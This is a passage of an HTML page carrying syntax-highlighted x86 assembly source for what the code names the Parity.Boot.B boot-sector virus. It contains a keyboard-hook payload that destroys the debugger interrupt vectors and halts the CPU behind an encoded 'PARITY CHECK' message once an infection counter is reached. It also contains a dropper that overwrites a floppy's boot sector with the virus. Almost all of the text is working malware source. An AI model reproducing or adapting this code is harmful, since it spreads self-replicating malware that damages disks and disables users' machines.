  </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                          </span><span class="sc1">; get scancode</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">                          </span><span class="sc1">; and DEL pressed ?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">no_reboot</span><span class="sc0">
  </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                          </span><span class="sc1">; complete the keyb I/O</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; by handshaking the</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                          </span><span class="sc1">; control reg.</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                        </span><span class="sc1">; set video mode 80x25x16</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                          </span><span class="sc1">; EOI</span><span class="sc0">
  </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">19h</span><span class="sc0">                             </span><span class="sc1">; Reboot system</span><span class="sc0">

</span><span class="sc5">no_reboot</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">046Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; clock tick hi</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; destroy INT 1 hi</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; destroy INT 3 hi</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; akt. hour = infections+start hour</span><span class="sc0">
  </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">_2</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; set video mode 40x25x16</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">                           </span><span class="sc1">; display "PARITY CHECK"</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">halt</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">next</span><span class="sc0">
</span><span class="sc5">halt</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">hlt</span><span class="sc0">                                    </span><span class="sc1">; halt CPU</span><span class="sc0">
</span><span class="sc5">_2</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0"> </span><span class="sc1">;jmp far F000h:E987h (org. Bios Keyboard Handler)</span><span class="sc0">
  
</span><span class="sc5">infection_signature</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0C9h</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">Partitions_Table</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">Dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Boot_Signature</span><span class="sc0">   </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
</span><span class="sc1">;===============================================================</span><span class="sc0">

</span><span class="sc5">DROPPER</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">Try_Again</span><span class="sc4">:</span><span class="sc0">      
  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_dropper</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inser_msg</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Reset drive A:</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Overwrite bootsector with</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; our virus.</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
  </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Try_Again</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Display message.</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Warning_Msg</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Exit_dropper</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">               </span><span class="sc1">; Exit to DOS</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Inser_Msg</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Please inser a Disk into drive A:'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">
</span><span class="sc5">Warning_Msg</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WARNING: Disk in drive A: is infected with Parity.Boot.B !'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">DROPPER</span></div></body>
</html>
